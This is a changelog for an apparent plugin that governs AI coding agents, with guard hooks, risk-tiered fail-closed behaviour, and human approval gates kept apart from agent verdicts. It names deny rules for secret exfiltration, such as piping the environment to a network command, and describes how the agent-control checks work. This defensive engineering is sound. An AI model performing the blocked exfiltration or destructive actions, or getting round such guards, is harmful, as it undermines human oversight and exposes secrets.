+workflows have an `AUTHORIZE` stage. A pipeline that deployed from `approved`
+must now wait for authorization. Project-local workflows need the stage added.
+
+**Breaking: `team` stages require `team_requirement` and `degraded_mode`.**
+
+**Behaviour change: incidents cannot mitigate before evidence is sealed.** For
+non-security incidents this is a short collection step; for security incidents it
+is mandatory and blocking.
+
+**Behaviour change: six new command rules.** Cloud resource deletion and
+container image deletion are **denied**; credential rotation, production config
+edits and production service restarts **escalate**. Check any automation that ran
+these from a session.
+
+## [0.2.0] — Second architecture iteration
+
+
+Addresses ten findings from architecture review. The workflow model from 0.1.0 is
+preserved; this release makes it machine-executable and auditable rather than
+adding agents.
+
+### Changed — guard failure behaviour is now risk-tiered
+
+The 0.1.0 blanket fail-open was wrong. The moment a guard breaks is the moment it
+matters.
+
+- **Tier 0 catastrophic screen** (`hooks/lib/failsafe.py`): pure regex, no file
+  I/O, no policy load, running **before** the policy engine. Holds when
+  `hook-policy.json` is missing, unparseable or wrong.
+- **Tier 1**: on evaluation failure, a high-risk-looking action is **denied**,
+  because the system can no longer prove it is safe.
+- **Tier 2**: anything else on evaluation failure **escalates** to a human — fail
+  closed without bricking the session.
+- **Tier 3**: only advisory guards (`guard_spawn`) fail open, with a notice.
+- Guards now load their policy with `policy_required()`, so a corrupt rule file
+  triggers the failure path instead of degrading to "no rules apply".
+- **Session-start self-test**: three known-dangerous payloads are run through the
+  safety guards; a failure opens the session with `SAFETY GUARDS ARE NOT WORKING`.
+
+### Added — approval authority, separated from agent verdicts
+
+- `policies/approval-authority.json`. An `agent_gate` blocks but never approves;
+  a `human_gate` is a named human's durable decision with `recorded_in`.
+- An agent-team lead's plan approval is classified as an **agent gate** and may
+  never satisfy an `AP-nn` item. A hook escalation is a decision about one tool
+  call, not an approval.
+- Artifacts carry `reviewers` (agent verdicts) and `approvals` (human decisions)
+  as separate fields that never merge.
+- Enforced by validation, by `EVAL-GOV-004`, and by `tests/test_repository.py`.
+
+### Added — formal artifact contracts
+
+- `policies/artifact-model.json`: 19 artifact types with lifecycle, owning role,
+  producing stage, required links, agent review and human approval.
+- `schemas/artifact-header.schema.json` v2 now requires `version`, `created_at`,
+  `updated_at`, `source`, and supports `reviewers`, `approvals`, `dependencies`.
+- Two new templates: `incident.md`, `dependency-assessment.md`.
+
+### Added — entry criteria and a checkable definition of done
+
+- Every stage now declares `entry_criteria`, `actions`, `produces`,
+  `definition_of_done`, `risk`, `complexity` and `execution`.
+- 14 DoD predicates; 165 predicate instances across the seven workflows.
+- `scripts/check_dod.py` validates predicate grammar in CI and **evaluates** the
+  DoD against a real project. Predicates needing GitLab evidence report
+  `REQUIRES-EVIDENCE` and are never counted as passing.
+
+### Added — executable model routing
+
+- `scripts/resolve_model.py` resolves role + risk + complexity to a model and
+  effort, printing its reasoning.
+- `policies/model-policy.json` gains an override order; a project override below
+  the risk floor is refused, and the refusal appears in the trace.
+- `.ai-engineering/project.yaml` gains `ai.model_overrides`,
+  `ai.execution_overrides` and `ai.agent_teams_available`.
+
+### Added — execution mode and system of record
+
+- `policies/execution-policy.json`: `inline`, `subagent` or `team`, with the
+  decision rule and the platform constraints. Teams are used in four places, each
+  justified in the stage's `actions`.
+- `policies/system-of-record.json`: GitLab and repository artifacts are
+  authoritative; the agent-team task list, session transcript and local audit log
+  are authoritative for **nothing**.
+
+### Added — dependency work is five routes, not one
+
+`WF-DEPENDENCY` (renamed from "dependency upgrade" to "dependency change") opens
+with `CLASSIFY`: `routine-upgrade`, `security-vulnerability`, `end-of-life`,
+`licence-compliance`, `new-capability`. Urgency comes from exploitability in this
+deployment or a support end date, never from a CVSS score alone.
+
+### Added
+
+- Docs: `docs/approvals.md`, `docs/execution.md`.
+- Rule SEC-07: piping the environment to a network command.
+- Four evaluation cases: `EVAL-SEC-005`, `EVAL-GOV-004`, `EVAL-GOV-005`,
+  `EVAL-AIG-005`. 46 cases, 24 deterministic.
+- 132 tests, including 16 covering guard failure behaviour against a sandboxed
+  plugin copy.
+- CI jobs: `contracts` and `guard-failure-behaviour`.
+
+### Fixed
+
+- `development-lead`, `engineering-director` and `incident-commander` owned
+  stages producing artifacts but had no write tool. New `lead` tool profile with
+  narrow allow-mode write scopes.
+- `dependency-reviewer` defaulted to `haiku`, below the MEDIUM risk floor. Now
+  `sonnet`.
+- Six workflow stages had an `agent_gate` reviewed by the stage's own owner.
+- `minyaml` coerced mapping keys, so a key named `on` became the boolean `true`.
+
+---
+
+### Migration: 0.1.0 → 0.2.0
+
+**Breaking: `approval_gate` is replaced by `agent_gate` and `human_gate`.**
+Any project-local workflow file must be updated. `type: independent-agent-review`
+becomes an `agent_gate` with a `reviewer`; `type: human` becomes a `human_gate`
+with an `approver` and a `recorded_in`. A stage needing both now declares both.
+
+**Breaking: stages require new fields.** `entry_criteria`,
+`definition_of_done`, `risk` and `execution` are now required. Validation fails
+without them.
+
+**Breaking: artifact headers require more fields.** `version`, `created_at`,
+`updated_at` and `source` are now required, and `created`/`updated` are renamed
+to `created_at`/`updated_at`. Existing artifacts need the four fields added;
+`source` is the one that needs thought, because an artifact with no source was
+invented.
+
+**Breaking: `sdlc/workflows/dependency-upgrade.yaml` is now
+`dependency-change.yaml`.** Update any reference to the filename. The workflow id
+`WF-DEPENDENCY` is unchanged.
+
+**Behaviour change: guards are stricter when broken.** Previously a guard failure
+allowed the call. It now denies high-risk actions and escalates everything else.
+If a guard is failing in your environment, you will notice — which is the point.
+Check `python3 --version` first.
+
+**Behaviour change: three roles gained write tools**, narrowly scoped.
+`engineering-director` can write `docs/decisions/**`, `docs/sdlc/**` and
+`.ai-engineering/**`; `development-lead` `docs/stories/**` and `docs/qa/**`;
+`incident-commander` `docs/incidents/**`. Projects that scope these paths
+elsewhere should adjust `policies/write-scope.json` in a fork or raise it as a
+governance change.
+
+## [0.1.0] — Initial release
+
+
+First coherent baseline of the AI Engineering OS. Every component is at
+lifecycle status `pilot`: validated, evaluated on its deterministic cases, and
+not yet promoted to `production`.
+
+### Organization
+
+- 29 agents across governance, product, architecture, UX, engineering, data, QA,
+  security, platform, release, SRE, incident management, documentation and AI
+  governance, including five independent specialist reviewers.
+- Canonical fifteen-section role contract, enforced by validation.
+- `policies/agent-registry.json` as the single source of truth for ownership,
+  risk, model, tool profile, spawn authority and evaluation suite.
+- Six tool profiles with per-role write scoping.
+- Spawn hierarchy with escalation paths; no agent may spawn a CRITICAL role.
+
+### Skills
+
+- 31 skills covering the lifecycle from requirements engineering to root cause
+  analysis, plus agent development, evaluation, governance, traceability and
+  agent-team patterns.
+- Technology-neutral throughout. `kubernetes-basics` is the single
+  platform-specific skill and declares its own applicability.
+
+### Guards
+
+- `guard_bash` with 33 rules across destructive filesystem, supply chain,
+  protected branches, history rewriting, secret access and exfiltration,
+  production access and mutation, destructive data operations and control-plane
+  tampering.
+- `guard_write` enforcing hard-denied paths, credential-adjacent escalation,
+  control-plane escalation, per-role write scope and secret content detection.
+- `guard_spawn` enforcing the organizational hierarchy.
+- `audit_log` and `session_context`.
+- Fail-open-with-notice, never emits `allow`, every denial carries a remediation.
+- Project overrides via `.ai-engineering/security.json`, additive by default;
+  waivers require a justification and an expiry.
+
+### Lifecycle
+
+- Seven machine-readable workflows: feature delivery, defect fix, incident
+  response, dependency upgrade, release, project onboarding, and change to the OS
+  itself.
+- Stage owners, participants, skills, inputs, outputs, artifacts, exit criteria,
+  approval gates and failure paths, all schema-validated.
+
+### Governance
+
+- 14 policy documents: model routing, risk classification, approvals, branching,
+  review routing, write scoping, spawn hierarchy, agent lifecycle, evaluation,
+  MCP extension, secret patterns, hook rules, tool profiles, agent registry.
+- Eleven human-approval categories and an explicit list of what stays autonomous.
+
+### Evaluation
+
+- 42 cases across 15 suites; 20 deterministic and running in CI, 22 LLM-judged
+  and reported as pending rather than auto-passed.
+- Every suite carries at least one adversarial case, enforced by validation.
+- `EVAL-DEV-002` is a permanent false-positive regression case for the guards.
+
+### Tooling
+
+- Zero-dependency validators: plugin structure and cross-document consistency,
+  schema validation, project configuration validation, secret scan, evaluation
+  runner, agent scaffolder.
+- Bundled `minyaml` and `jsonschema_mini` so CI needs no `pip install`.
+- 105 tests covering guards, libraries and organizational invariants, including a
+  standing false-positive sweep over 70 ordinary development commands and 20
+  ordinary write paths.
+
+### Documentation
+
+- Twenty documents plus three worked end-to-end examples.
+- `docs/limitations.md` states what V1 cannot do, without workarounds that only
+  appear to work.
+
+### Known deviations from the original design
+
+Recorded with reasons in `docs/architecture.md`: `sdlc/` rather than
+`workflows/`; no plugin-root `settings.json`; no `.mcp.json`; organizational
+metadata in a registry rather than agent frontmatter; agent-team patterns as
+prompts rather than configuration; no `senior-*` agents.
